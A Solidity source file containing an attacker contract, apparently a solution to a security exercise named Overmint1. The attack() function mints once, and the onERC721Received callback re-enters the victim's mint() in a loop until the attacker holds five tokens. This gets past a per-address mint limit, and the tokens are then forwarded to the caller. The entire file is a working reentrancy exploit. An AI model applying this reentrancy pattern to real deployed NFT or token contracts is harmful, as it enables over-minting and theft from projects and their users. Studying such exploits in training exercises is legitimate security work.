// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import { Overmint1 } from "../Overmint1.sol";

contract Overmint1Attacker {
   Overmint1 public victimContract;

  constructor(address _victimContract) {
    victimContract = Overmint1(_victimContract);
  }

  function attack() external {
    victimContract.mint(); // 1st mint

    victimContract.safeTransferFrom(address(this), msg.sender, 1);
    victimContract.safeTransferFrom(address(this), msg.sender, 2);
    victimContract.safeTransferFrom(address(this), msg.sender, 3);
    victimContract.safeTransferFrom(address(this), msg.sender, 4);
    victimContract.safeTransferFrom(address(this), msg.sender, 5);
  }

  function onERC721Received(
    address /*_operator*/,
    address /*_from*/,
    uint256 /*_tokenId*/,
    bytes calldata /*_data*/
  ) external returns(bytes4) {
    while (victimContract.balanceOf(address(this)) < 5) {
      victimContract.mint();
    }

    return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
  }
}
